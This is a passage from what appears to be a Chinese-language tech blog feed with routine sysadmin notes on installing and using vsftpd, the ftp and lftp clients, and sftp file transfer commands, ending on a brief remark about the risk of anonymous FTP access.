    <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a><strong>简介</strong></h1><p>FTP（File Transfer Protocol）文件传输协议，用于在网络上进行文件传输的协议</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a><strong>安装</strong></h1><h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h2><p>Linux下常用的ftp工具为vsftp</p><h3 id="检查是否安装"><a href="#检查是否安装" class="headerlink" title="检查是否安装"></a><strong>检查是否安装</strong></h3><p>rpm -qa | grep vsftpd</p><h3 id="yum安装"><a href="#yum安装" class="headerlink" title="yum安装"></a><strong>yum安装</strong></h3><p>yum install vsftpd -y</p><h1 id="操作"><a href="#操作" class="headerlink" title="操作"></a><strong>操作</strong></h1><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a><strong>启动</strong></h2><p>service vsftpd start</p><p>systemctl start vsftpd</p><h2 id="停止"><a href="#停止" class="headerlink" title="停止"></a><strong>停止</strong></h2><p>service vsftpd stop</p><p>systemctl stop vsftpd</p><h2 id="状态"><a href="#状态" class="headerlink" title="状态"></a><strong>状态</strong></h2><p>service vsftpd status</p><p>systemctl status vsftpd</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dts">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-meta"># service vsftpd status</span><br>Redirecting to <span class="hljs-keyword">/bin/</span>systemctl status vsftpd.service<br>● vsftpd.service - Vsftpd ftp daemon<br><span class="hljs-symbol">   Loaded:</span> loaded (<span class="hljs-keyword">/usr/</span>lib<span class="hljs-keyword">/systemd/</span>system/vsftpd.<span class="hljs-attr">service</span><span class="hljs-punctuation">;</span> <span class="hljs-attr">disabled</span><span class="hljs-punctuation">;</span> vendor preset: disabled)<br><span class="hljs-symbol">   Active:</span> inactive (dead)<br>[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-meta"># systemctl status vsftpd</span><br>● vsftpd.service - Vsftpd ftp daemon<br><span class="hljs-symbol">   Loaded:</span> loaded (<span class="hljs-keyword">/usr/</span>lib<span class="hljs-keyword">/systemd/</span>system/vsftpd.<span class="hljs-attr">service</span><span class="hljs-punctuation">;</span> <span class="hljs-attr">disabled</span><span class="hljs-punctuation">;</span> vendor preset: disabled)<br><span class="hljs-symbol">   Active:</span> inactive (dead)<br></code></pre></td></tr></table></figure><h1 id="默认信息"><a href="#默认信息" class="headerlink" title="默认信息"></a><strong>默认信息</strong></h1><h2 id="默认可执行文件"><a href="#默认可执行文件" class="headerlink" title="默认可执行文件"></a><strong>默认可执行文件</strong></h2><p>&#x2F;usr&#x2F;sbin&#x2F;vsftpd</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lat <span class="hljs-regexp">/usr/</span>sbin<span class="hljs-regexp">/vsftpd -rwxr-xr-x 1 root root 175440 6月  10 2021 /</span>usr<span class="hljs-regexp">/sbin/</span>vsftpd<br></code></pre></td></tr></table></figure><h2 id="默认安装配置目录"><a href="#默认安装配置目录" class="headerlink" title="默认安装配置目录"></a><strong>默认安装配置目录</strong></h2><p>&#x2F;etc&#x2F;vsftpd&#x2F;</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@iZbp1191gh7vw52537lyxrZ ~]# <span class="hljs-built_in">ls</span> -ld /etc/vsftpd/ drwxr-xr-x 2 root root 4096 4月   3 19:52 /etc/vsftpd/<br></code></pre></td></tr></table></figure><h2 id="默认核心配置文件"><a href="#默认核心配置文件" class="headerlink" title="默认核心配置文件"></a><strong>默认核心配置文件</strong></h2><p>&#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lat <span class="hljs-regexp">/etc/</span>vsftpd<span class="hljs-regexp">/vsftpd.conf -rw------- 1 root root 5116 6月  10 2021 /</span>etc<span class="hljs-regexp">/vsftpd/</span>vsftpd.conf<br></code></pre></td></tr></table></figure><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">anonymous_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">local_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">write_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">local_umask</span>=<span class="hljs-number">022</span><br><span class="hljs-attr">dirmessage_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">xferlog_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">connect_from_port_20</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">xferlog_std_format</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">listen</span>=<span class="hljs-literal">NO</span><br><span class="hljs-attr">listen_ipv6</span>=<span class="hljs-literal">YES</span><br><br><span class="hljs-attr">pam_service_name</span>=vsftpd<br><span class="hljs-attr">userlist_enable</span>=<span class="hljs-literal">YES</span><br><span class="hljs-attr">tcp_wrappers</span>=<span class="hljs-literal">YES</span><br></code></pre></td></tr></table></figure><h3 id="配置说明"><a href="#配置说明" class="headerlink" title="配置说明"></a><strong>配置说明</strong></h3><p>anonymous_enable&#x3D;YES # 允许匿名登录</p><p>local_enable&#x3D;YES # 允许本地用户登录</p><p>write_enable&#x3D;YES # 允许写操作</p><p>local_umask&#x3D;022 # 新增文件权限，默认022</p><h2 id="默认日志"><a href="#默认日志" class="headerlink" title="默认日志"></a><strong>默认日志</strong></h2><p>yum 安装默认没有开启日志功能，需要额外配置</p><p>常见日志路径&#x2F;var&#x2F;log&#x2F;vsftpd.log</p><p>日志开启配置</p><h1 id="ftp远程连接"><a href="#ftp远程连接" class="headerlink" title="ftp远程连接"></a><strong>ftp远程连接</strong></h1><h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a><strong>Linux</strong></h2><h3 id="ftp命令"><a href="#ftp命令" class="headerlink" title="ftp命令"></a><strong>ftp命令</strong></h3><p>命令安装</p><p>yum install ftp -y</p><p>连接</p><p>ftp ftp.example.com</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">(base) [root@aliyun ~]<span class="hljs-comment"># ftp 1.1.1.1 Connected to 1.1.1.1 (1.1.1.1). 220  ftp ready. Name (1.1.1.16:root): anonymous 331 Username ok, send password. Password: 530 Authentication failed.id: 003</span><br></code></pre></td></tr></table></figure><p>如果支持匿名访问，用户名可以输入<strong>anonymous</strong>，密码为<strong>邮件地址</strong>或者<strong>空</strong></p><h3 id="lftp命令"><a href="#lftp命令" class="headerlink" title="lftp命令"></a><strong>lftp命令</strong></h3><h4 id="命令安装"><a href="#命令安装" class="headerlink" title="命令安装"></a><strong>命令安装</strong></h4><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">yum <span class="hljs-keyword">install</span> lftp -y<br></code></pre></td></tr></table></figure><h4 id="连接默认端口"><a href="#连接默认端口" class="headerlink" title="连接默认端口"></a><strong>连接默认端口</strong></h4><p>lftp <a href="ftp://ftp.example.com/">ftp://ftp.example.com</a></p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart">(<span class="hljs-keyword">base</span>) [root<span class="hljs-meta">@aliyun</span> ~]# lftp ftp:<span class="hljs-comment">//1.1.1.1 lftp 1.1.1.1:~&gt; ls</span><br></code></pre></td></tr></table></figure><h4 id="连接指定端口"><a href="#连接指定端口" class="headerlink" title="连接指定端口"></a><strong>连接指定端口</strong></h4><p>lftp <a href="ftp://ftp.example.com:port">ftp://ftp.example.com:port</a></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">[root<span class="hljs-title">@nvm</span> /]# lftp ftp://<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>:<span class="hljs-number">2121</span> lftp <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>:~&gt; ls drwxr-xr-<span class="hljs-keyword">x</span>    <span class="hljs-number">2</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> Aug <span class="hljs-number">06</span>  <span class="hljs-number">2019</span> pub drwxr-xrwx    <span class="hljs-number">4</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> Nov <span class="hljs-number">11</span>  <span class="hljs-number">2020</span> report drwxr-xr-<span class="hljs-keyword">x</span>    <span class="hljs-number">2</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>            <span class="hljs-number">4096</span> May <span class="hljs-number">24</span>  <span class="hljs-number">2021</span> test drwxr-xr-<span class="hljs-keyword">x</span>    <span class="hljs-number">3</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>           <span class="hljs-number">12288</span> Mar <span class="hljs-number">12</span>  <span class="hljs-number">2023</span> tmp drwxr-xrwx   <span class="hljs-number">27</span> <span class="hljs-number">0</span>        <span class="hljs-number">0</span>           <span class="hljs-number">12288</span> Jul <span class="hljs-number">15</span> <span class="hljs-number">07</span>:<span class="hljs-number">56</span> upload<br></code></pre></td></tr></table></figure><h1 id="ftp操作命令"><a href="#ftp操作命令" class="headerlink" title="ftp操作命令"></a><strong>ftp操作命令</strong></h1><h2 id="ls-dir"><a href="#ls-dir" class="headerlink" title="ls&#x2F;dir"></a><strong>ls&#x2F;dir</strong></h2><p>列出当前路径下文件及文件夹</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs tap">[root@nvm /]<span class="hljs-comment"># lftp ftp://1.1.1.1:2121</span><br>lftp 1.1.1.1:~&gt; ls<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 06 </span><span class="hljs-number"> 2019 </span>pub<br>drwxr-xrwx   <span class="hljs-number"> 4 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 11 </span><span class="hljs-number"> 2020 </span>report<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 24 </span><span class="hljs-number"> 2021 </span>test<br>drwxr-xr-x   <span class="hljs-number"> 3 </span>0       <span class="hljs-number"> 0 </span>         <span class="hljs-number"> 12288 </span>Mar<span class="hljs-number"> 12 </span><span class="hljs-number"> 2023 </span>tmp<br>drwxr-xrwx  <span class="hljs-number"> 27 </span>0       <span class="hljs-number"> 0 </span>         <span class="hljs-number"> 12288 </span>Jul<span class="hljs-number"> 15 </span>07:56 upload<br>lftp 1.1.1.1:/&gt; dir<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Aug<span class="hljs-number"> 06 </span><span class="hljs-number"> 2019 </span>pub<br>drwxr-xrwx   <span class="hljs-number"> 4 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>Nov<span class="hljs-number"> 11 </span><span class="hljs-number"> 2020 </span>report<br>drwxr-xr-x   <span class="hljs-number"> 2 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 4096 </span>May<span class="hljs-number"> 24 </span><span class="hljs-number"> 2021 </span>test<br>drwxr-xr-x   <span class="hljs-number"> 3 </span>0       <span class="hljs-number"> 0 </span>         <span class="hljs-number"> 12288 </span>Mar<span class="hljs-number"> 12 </span><span class="hljs-number"> 2023 </span>tmp<br>drwxr-xrwx  <span class="hljs-number"> 27 </span>0       <span class="hljs-number"> 0 </span>         <span class="hljs-number"> 12288 </span>Jul<span class="hljs-number"> 15 </span>07:56 upload<br></code></pre></td></tr></table></figure><h2 id="cd-dirname"><a href="#cd-dirname" class="headerlink" title="cd dirname"></a><strong>cd dirname</strong></h2><p>切换目录</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">lftp <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span><span class="hljs-symbol">:/&gt;</span> cd pub lftp <span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span><span class="hljs-symbol">:/pub&gt;</span><br></code></pre></td></tr></table></figure><h2 id="put-local-file-remote-fil"><a href="#put-local-file-remote-fil" class="headerlink" title="put local-file remote-fil"></a>put local-file remote-fil</h2><h2 id="quit-bye"><a href="#quit-bye" class="headerlink" title="quit&#x2F;bye"></a><strong>quit&#x2F;bye</strong></h2><p>退出会话</p><p>lftp 1.1.1.1:&#x2F;pub&gt; quit (base) [root@nvm &#x2F;]# lftp <a href="ftp://1.1.1.1/">ftp://1.1.1.1</a> lftp 1.1.1.1:~&gt; bye (base) [root@nvm &#x2F;]#</p><h2 id="put-mput"><a href="#put-mput" class="headerlink" title="put&#x2F;mput"></a><strong>put&#x2F;mput</strong></h2><p>上传文件</p><h1 id="风险"><a href="#风险" class="headerlink" title="风险"></a><strong>风险</strong></h1><h2 id="匿名访问风险"><a href="#匿名访问风险" class="headerlink" title="匿名访问风险"></a><strong>匿名访问风险</strong></h2><p>用户名 <strong>anonymous</strong>，密码为<strong>邮件地址</strong>或者<strong>空</strong></p><p><strong>默认安装的</strong></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>ftp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sftp_base</title>
    <link href="/2024/03/04/yunwei/applications/ftp/sftp_base/"/>
    <url>/2024/03/04/yunwei/applications/ftp/sftp_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="SSH文件传输协议-安全文件传输协议"><a href="#SSH文件传输协议-安全文件传输协议" class="headerlink" title="SSH文件传输协议&#x2F;安全文件传输协议"></a>SSH文件传输协议&#x2F;安全文件传输协议</h1><p>SSH File Transfer Protocol</p><p>Secret File Transfer Protocol</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>使用ssh协议进行文件传输</p><h2 id="默认端口"><a href="#默认端口" class="headerlink" title="默认端口"></a>默认端口</h2><p>22</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>sftp是基于ssh协议，安装OpenSSH软件即可</p><h4 id="Ubuntu、Debian服务器"><a href="#Ubuntu、Debian服务器" class="headerlink" title="Ubuntu、Debian服务器"></a>Ubuntu、Debian服务器</h4><h5 id="dpkg-l-grep-ssh"><a href="#dpkg-l-grep-ssh" class="headerlink" title="dpkg -l | grep ssh"></a>dpkg -l | grep ssh</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(base) root@VM<span class="hljs-number">-8</span><span class="hljs-number">-5</span>-ubuntu:~# dpkg -l | grep ssh<br>ii  libssh<span class="hljs-number">-4</span>:amd64                       <span class="hljs-number">0.9</span><span class="hljs-number">.3</span><span class="hljs-number">-2</span>ubuntu2<span class="hljs-number">.1</span>                  amd64        tiny C SSH library (OpenSSL flavor)<br>ii  openssh-client                       <span class="hljs-number">1</span>:<span class="hljs-number">8.2</span>p1<span class="hljs-number">-4</span>ubuntu0<span class="hljs-number">.2</span>                amd64        secure shell (SSH) client, <span class="hljs-keyword">for</span> secure <span class="hljs-keyword">access</span> <span class="hljs-keyword">to</span> remote machines<br>ii  openssh-<span class="hljs-keyword">server</span>                       <span class="hljs-number">1</span>:<span class="hljs-number">8.2</span>p1<span class="hljs-number">-4</span>ubuntu0<span class="hljs-number">.2</span>                amd64        secure shell (SSH) <span class="hljs-keyword">server</span>, <span class="hljs-keyword">for</span> secure <span class="hljs-keyword">access</span> <span class="hljs-keyword">from</span> remote machines<br>ii  openssh-sftp-<span class="hljs-keyword">server</span>                  <span class="hljs-number">1</span>:<span class="hljs-number">8.2</span>p1<span class="hljs-number">-4</span>ubuntu0<span class="hljs-number">.2</span>                amd64        secure shell (SSH) sftp <span class="hljs-keyword">server</span> module, <span class="hljs-keyword">for</span> SFTP <span class="hljs-keyword">access</span> <span class="hljs-keyword">from</span> remote machines<br>ii  ssh-<span class="hljs-keyword">import</span>-id                        <span class="hljs-number">5.10</span><span class="hljs-number">-0</span>ubuntu1                     <span class="hljs-keyword">all</span>          securely retrieve an SSH <span class="hljs-built_in">public</span> key <span class="hljs-keyword">and</span> install it locally<br></code></pre></td></tr></table></figure><p>ii 表示已安装的软件包</p><h4 id="redhat、Centos等服务器"><a href="#redhat、Centos等服务器" class="headerlink" title="redhat、Centos等服务器"></a>redhat、Centos等服务器</h4><h5 id="rpm-qa-grep-ssh"><a href="#rpm-qa-grep-ssh" class="headerlink" title="rpm -qa | grep ssh"></a>rpm -qa | grep ssh</h5><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs subunit">(base) [root@110 ~]# rpm -qa | grep ssh<br>libssh2<span class="hljs-string">-1</span>.8.0<span class="hljs-string">-4</span>.el7.x86_64<br>openssh-server<span class="hljs-string">-7</span>.4p1<span class="hljs-string">-21</span>.el7.x86_64<br>openssh<span class="hljs-string">-7</span>.4p1<span class="hljs-string">-21</span>.el7.x86_64<br>openssh-clients<span class="hljs-string">-7</span>.4p1<span class="hljs-string">-21</span>.el7.x86_64<br></code></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><h4 id="sftp-user-host-dir"><a href="#sftp-user-host-dir" class="headerlink" title="sftp [user@]host[:dir[&#x2F;]]"></a>sftp [user@]host[:dir[&#x2F;]]</h4><h4 id="sftp-user-host-dir-p-port"><a href="#sftp-user-host-dir-p-port" class="headerlink" title="sftp [user@]host[:dir[&#x2F;]] -p port"></a>sftp [user@]host[:dir[&#x2F;]] -p port</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\WINDOWS\system32&gt;sftp ubuntu@<span class="hljs-number">114</span>.xxx.xxx.<span class="hljs-number">141</span><br><span class="hljs-attribute">ubuntu</span>@<span class="hljs-number">114</span>.xxx.xxx.<span class="hljs-number">141</span>&#x27;s password:<br><span class="hljs-attribute">Connected</span> to <span class="hljs-number">114</span>.xxx.xxx.<span class="hljs-number">141</span>.<br><span class="hljs-attribute">sftp</span>&gt; ls<br><span class="hljs-attribute">sftp</span>&gt; pwd<br><span class="hljs-attribute">Remote</span> working directory: /home/ubuntu<br><span class="hljs-attribute">sftp</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="上传"><a href="#上传" class="headerlink" title="上传"></a>上传</h3><p>基于登录情况下，也就是sftp终端界面</p><h4 id="上传本地文件到远程目录"><a href="#上传本地文件到远程目录" class="headerlink" title="上传本地文件到远程目录"></a>上传本地文件到远程目录</h4><p>put localfile [remotedir]</p><p>如果不指定目录，上传到当前所在目录</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sftp</span>&gt; put sftpput.txt<br><span class="hljs-attribute">Uploading</span> sftpput.txt to /home/ubuntu/sftpput.txt<br><span class="hljs-attribute">sftpput</span>.txt                                                                                                    <span class="hljs-number">100</span>%   <span class="hljs-number">12</span>     <span class="hljs-number">0</span>.<span class="hljs-number">3</span>KB/s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span><br><span class="hljs-attribute">sftp</span>&gt; ls<br><span class="hljs-attribute">sftpput</span>.txt<br><span class="hljs-attribute">sftp</span>&gt; pwd<br><span class="hljs-attribute">Remote</span> working directory: /home/ubuntu<br></code></pre></td></tr></table></figure><p>如果指定目录，可能会存在当前登录账号权限不足的问题</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">sftp&gt; <span class="hljs-keyword">put</span> sftpput.txt /<span class="hljs-keyword">opt</span>/test/<br>Uploading sftpput.txt <span class="hljs-keyword">to</span> /<span class="hljs-keyword">opt</span>/test/sftpput.txt<br>remote <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;/opt/test/sftpput.txt&quot;</span>): Permission denied<br></code></pre></td></tr></table></figure><h4 id="上传本地目录文件到远程目录"><a href="#上传本地目录文件到远程目录" class="headerlink" title="上传本地目录文件到远程目录"></a>上传本地目录文件到远程目录</h4><p>put -r localDir remoteDir</p><h4 id="上传多个文件到远程目录"><a href="#上传多个文件到远程目录" class="headerlink" title="上传多个文件到远程目录"></a>上传多个文件到远程目录</h4><p>文件名支持通配符*</p><p>mput localfile remoteDir</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk">sftp&gt; mput .<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/*.txt ./</span><br>Uploading .<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/1.txt to /</span>home<span class="hljs-regexp">/ubuntu/</span>./<span class="hljs-number">1</span>.txt<br>.<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/1.txt                                                 100%    6     0.2KB/</span>s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>Uploading .<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/2.txt to /</span>home<span class="hljs-regexp">/ubuntu/</span>./<span class="hljs-number">2</span>.txt<br>.<span class="hljs-regexp">/test/</span>dirput/<span class="hljs-number">2</span>.txt<br></code></pre></td></tr></table></figure><h4 id="上传多个目录的文件到远程目录"><a href="#上传多个目录的文件到远程目录" class="headerlink" title="上传多个目录的文件到远程目录"></a>上传多个目录的文件到远程目录</h4><p>目录名支持通配符*</p><p>mput -r locatDirs remoteDir</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs awk">sftp&gt; mput -r .<span class="hljs-regexp">/test/</span>dir* <span class="hljs-regexp">/home/u</span>buntu<br>Uploading .<span class="hljs-regexp">/test/</span>dirmput<span class="hljs-regexp">/ to /</span>home<span class="hljs-regexp">/ubuntu/</span><br>Entering .<span class="hljs-regexp">/test/</span>dirmput/<br>.<span class="hljs-regexp">/test/</span>dirmput<span class="hljs-regexp">/mput1.txt                                            100%    0     0.0KB/</span>s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>.<span class="hljs-regexp">/test/</span>dirmput<span class="hljs-regexp">/mput2.txt                                            100%    0     0.0KB/</span>s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>Uploading .<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/ to /</span>home<span class="hljs-regexp">/ubuntu/</span><br>Entering .<span class="hljs-regexp">/test/</span>dirput/<br>.<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/1.txt                                                 100%    6     0.2KB/</span>s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>.<span class="hljs-regexp">/test/</span>dirput<span class="hljs-regexp">/2.txt                                                 100%    6     0.2KB/</span>s   <span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>sftp&gt; ls<br><span class="hljs-number">1</span>.txt         <span class="hljs-number">2</span>.txt         mput1.txt     mput2.txt     sftpput.txt<br></code></pre></td></tr></table></figure><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><h4 id="下载远程文件到本地目录"><a href="#下载远程文件到本地目录" class="headerlink" title="下载远程文件到本地目录"></a>下载远程文件到本地目录</h4><p>get remoteFile [localDir]</p><h4 id="下载远程目录文件到本地目录"><a href="#下载远程目录文件到本地目录" class="headerlink" title="下载远程目录文件到本地目录"></a>下载远程目录文件到本地目录</h4><p>get -r remoteDirFiles [localDir]</p><h4 id="下载多个远程文件到本地目录"><a href="#下载多个远程文件到本地目录" class="headerlink" title="下载多个远程文件到本地目录"></a>下载多个远程文件到本地目录</h4><p>文件名支持通配符*</p><p>mget remoteFiles [localDir]</p><h4 id="下载多个远程目录的文件到本地目录"><a href="#下载多个远程目录的文件到本地目录" class="headerlink" title="下载多个远程目录的文件到本地目录"></a>下载多个远程目录的文件到本地目录</h4><p>目录名支持通配符*</p><p>mget remoteDirsFile [localDir]</p><h3 id="执行远程命令"><a href="#执行远程命令" class="headerlink" title="执行远程命令"></a>执行远程命令</h3><h4 id="删除-rm"><a href="#删除-rm" class="headerlink" title="删除 rm"></a>删除 rm</h4><p>没有 -r -f  这种参数，每次也只能删除一个文件，多个文件名只删除第一个</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sftp</span>&gt; rm -rf <span class="hljs-number">1</span>.txt <span class="hljs-number">2</span>.txt<br><span class="hljs-attribute">rm</span>: Invalid flag -r<br><span class="hljs-attribute">sftp</span>&gt; rm -f <span class="hljs-number">1</span>.txt <span class="hljs-number">2</span>.txt<br><span class="hljs-attribute">rm</span>: Invalid flag -f<br><span class="hljs-attribute">sftp</span>&gt; rm <span class="hljs-number">1</span>.txt <span class="hljs-number">2</span>.txt<br><span class="hljs-attribute">Removing</span> /home/ubuntu/<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><h4 id="列表-ls"><a href="#列表-ls" class="headerlink" title="列表 ls"></a>列表 ls</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">sftp&gt; </span><span class="language-bash"><span class="hljs-built_in">ls</span></span><br>2.txt         sftpput.txt<br></code></pre></td></tr></table></figure><h4 id="权限修改-chmod"><a href="#权限修改-chmod" class="headerlink" title="权限修改 chmod"></a>权限修改 chmod</h4><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs tap">sftp&gt; ls -l<br>-rw-rw-r--   <span class="hljs-number"> 1 </span>ubuntu   ubuntu         <span class="hljs-number"> 6 </span>May<span class="hljs-number"> 20 </span>23:44 2.txt<br>-rw-rw-r--   <span class="hljs-number"> 1 </span>ubuntu   ubuntu        <span class="hljs-number"> 12 </span>May<span class="hljs-number"> 20 </span>23:38 sftpput.txt<br>sftp&gt; chmod<span class="hljs-number"> 777 </span>2.txt<br>Changing mode on /home/ubuntu/2.txt<br>sftp&gt; ls -l<br>-rwxrwxrwx   <span class="hljs-number"> 1 </span>ubuntu   ubuntu         <span class="hljs-number"> 6 </span>May<span class="hljs-number"> 20 </span>23:44 2.txt<br>-rw-rw-r--   <span class="hljs-number"> 1 </span>ubuntu   ubuntu        <span class="hljs-number"> 12 </span>May<span class="hljs-number"> 20 </span>23:38 sftpput.txt<br></code></pre></td></tr></table></figure><h3 id="执行本地命令"><a href="#执行本地命令" class="headerlink" title="执行本地命令"></a>执行本地命令</h3><h4 id="sftp命令-常规命令前加-l"><a href="#sftp命令-常规命令前加-l" class="headerlink" 